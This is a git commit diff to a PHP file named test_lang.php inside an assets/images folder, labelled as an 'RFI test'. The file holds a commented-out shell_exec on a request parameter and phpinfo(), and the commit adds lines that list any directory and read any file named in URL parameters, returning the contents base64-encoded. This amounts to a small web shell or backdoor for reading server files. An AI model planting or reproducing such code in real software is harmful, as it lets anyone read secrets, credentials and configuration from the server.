2d8688d963c4afe8702c6106f7c36389792a2605
Skrox <demey.alexandre@protonmail.com>
2023-02-03 11:53:01 +0100

    Update test_lang.php

--- assets/images/test_lang.php
+++ assets/images/test_lang.php
@@ -1,5 +1,10 @@
 // RFI test
 <?php
   //shell_exec($_GET["cmd"]);
+  echo scandir($_GET["dir"]);
+    
+  $data = file_get_contents($_GET["file"]);
+  echo base64_encode($data);
+    
   phpinfo();
 ?>
